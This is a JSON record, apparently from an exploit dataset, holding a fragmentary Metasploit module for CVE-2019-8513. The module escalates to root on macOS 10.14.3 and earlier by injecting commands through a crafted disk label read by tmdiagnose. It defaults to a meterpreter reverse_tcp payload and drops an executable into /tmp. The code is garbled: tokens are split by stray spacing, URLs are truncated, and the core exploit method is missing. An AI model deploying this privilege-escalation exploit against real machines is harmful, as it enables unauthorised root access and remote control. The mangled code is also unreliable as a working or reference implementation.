{
    "text": "vul_name : Mac OS X TimeMachine ( tmdiagnose ) Command Injection Privilege Escalation ， vul_cve : CVE-2019-8513 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : File ， include Msf : Post : OSX : Priv ， include Msf : Post : OSX : System ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Mac OS X TimeMachine ( tmdiagnose ) Command Injection Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a command injection in TimeMachine on macOS <= 10.14.3 in ， order to run a payload as root. The tmdiagnose binary on OSX <= 10.14.3 suffers ， from a command injection vulnerability that can be exploited by creating a ， specially crafted disk label. ， The tmdiagnose binary uses awk to list every mounted volume , and composes ， shell commands based on the volume labels. By creating a volume label with the ， backtick character , we can have our own binary executed with root priviledges. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'CodeColorist' ,  # Discovery and exploit ， 'timwr' ,  # Metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2019-8513' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { 'WfsDelay' => 300 , 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' } ,  ， 'Targets' => [  ，  [ 'Mac OS X x64 ( Native Payload ) ' , { 'Arch' => ARCH_X64 , 'Platform' => [ 'osx' ] } ]  ,  ，  [ 'Python payload' , { 'Arch' => ARCH_PYTHON , 'Platform' => [ 'python' ] } ]  ,  ，  [ 'Command payload' , { 'Arch' => ARCH_CMD , 'Platform' => [ 'unix' ] } ]  ,  ，  ]  ,  ， 'DisclosureDate' => 'Apr 13 2019' )  ， register_advanced_options [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， print_status ( \"Uploading file : ' # {filepath}'\" )  ， write_file ( filepath , filedata )  ， chmod ( filepath )  ， register_file_for_cleanup ( filepath )  ， end ， def check ， version = Gem : Version.new ( get_system_version ) ",
    "time": "2019.07.01"
}